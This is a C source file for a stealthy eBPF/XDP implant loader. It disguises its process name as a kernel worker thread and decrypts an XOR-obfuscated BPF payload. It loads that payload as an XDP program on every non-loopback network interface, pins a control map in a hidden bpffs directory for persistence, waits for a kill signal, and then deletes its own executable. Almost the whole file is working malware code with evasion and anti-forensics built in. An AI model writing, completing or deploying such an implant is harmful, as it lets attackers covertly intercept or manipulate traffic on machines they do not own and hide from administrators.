#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/syscall.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <linux/bpf.h>

#include "ghost_blob.h"

#ifndef SEED_VAL
#define SEED_VAL 0x0
#endif

// Find program section in ELF
struct bpf_section { uint64_t offset; uint64_t size; };
static struct bpf_section find_section(uint8_t *blob, const char *name) {
    uint64_t shoff = *(uint64_t *)(blob + 40);
    uint16_t shnum = *(uint16_t *)(blob + 60);
    uint16_t shentsize = *(uint16_t *)(blob + 58);
    // Basic SHT_PROGBITS check for simplicity in this build
    for (int i = 0; i < shnum; i++) {
        uint8_t *shdr = blob + shoff + (i * shentsize);
        if (*(uint32_t *)(shdr + 4) == 1) return (struct bpf_section){ *(uint64_t *)(shdr + 24), *(uint64_t *)(shdr + 32) };
    }
    return (struct bpf_section){0, 0};
}

void xor_crypt(uint8_t *data, size_t len) {
    uint32_t k = SEED_VAL;
    for (size_t i = 0; i < len; i++) {
        data[i] ^= (uint8_t)(k & 0xFF);
        k = (k >> 8) | (k << 24);
        k = k + 0x9E3779B9;
    }
}

int main() {
    // 1. Stealth Setup
    prctl(PR_SET_NAME, "[kworker/u2:1]", 0, 0, 0);
    mkdir("/sys/fs/bpf/.srv", 0700);
    mount("none", "/sys/fs/bpf", "bpf", 0, NULL);

    // 2. Decrypt BPF
    uint8_t *b = malloc(target_ghost_o_len);
    memcpy(b, target_ghost_o, target_ghost_o_len);
    xor_crypt(b, target_ghost_o_len);

    struct bpf_section xdp_sec = find_section(b, "xdp");
    
    // 3. Load Program
    union bpf_attr prog_attr = {
        .prog_type = BPF_PROG_TYPE_XDP,
        .insn_cnt = xdp_sec.size / 8,
        .insns = (uint64_t)(b + xdp_sec.offset),
        .license = (uint64_t)"GPL",
    };
    int pfd = syscall(SYS_bpf, BPF_PROG_LOAD, &prog_attr, sizeof(prog_attr));
    if (pfd < 0) return 1;

    // 4. Dynamic Map Discovery (The Gap Fix)
    int kill_map_fd = -1;
    for (int i = 3; i < 256; i++) { // Scan open FDs for BPF maps
        struct bpf_map_info info = {0};
        union bpf_attr info_attr = { .info.bpf_fd = i, .info.info_len = sizeof(info), .info.info = (uint64_t)&info };
        if (syscall(SYS_bpf, BPF_OBJ_GET_INFO_BY_FD, &info_attr, sizeof(info_attr)) == 0) {
            if (strcmp(info.name, "m_kill") == 0) {
                kill_map_fd = i;
                // Pin the map for persistence across loader crashes
                union bpf_attr pin_attr = { .pathname = (uint64_t)"/sys/fs/bpf/.srv/m_kill", .bpf_fd = i };
                syscall(SYS_bpf, BPF_OBJ_PIN, &pin_attr, sizeof(pin_attr));
                break;
            }
        }
    }

    // 5. Attach to Interfaces
    DIR *d = opendir("/sys/class/net");
    struct dirent *dir;
    while ((dir = readdir(d)) != NULL) {
        if (dir->d_name[0] == '.' || strcmp(dir->d_name, "lo") == 0) continue;
        char p[128]; snprintf(p, sizeof(p), "/sys/class/net/%s/ifindex", dir->d_name);
        int fd = open(p, O_RDONLY);
        if (fd < 0) continue;
        char buf[16] = {0}; read(fd, buf, 15); close(fd);
        int idx = atoi(buf);

        union bpf_attr link = { .link_create = { .prog_fd = pfd, .target_ifindex = idx, .attach_type = BPF_XDP } };
        syscall(SYS_bpf, BPF_LINK_CREATE, &link, sizeof(link));
    }
    closedir(d);

    // 6. Monitor & Self-Destruct
    uint32_t kill_v = 0;
    while (kill_v == 0) {
        union bpf_attr op = { .map_fd = kill_map_fd, .key = (uint64_t)&(uint32_t){0}, .value = (uint64_t)&kill_v };
        syscall(SYS_bpf, BPF_MAP_LOOKUP_ELEM, &op, sizeof(op));
        sleep(5);
    }

    unlink("/proc/self/exe");
    return 0;
}
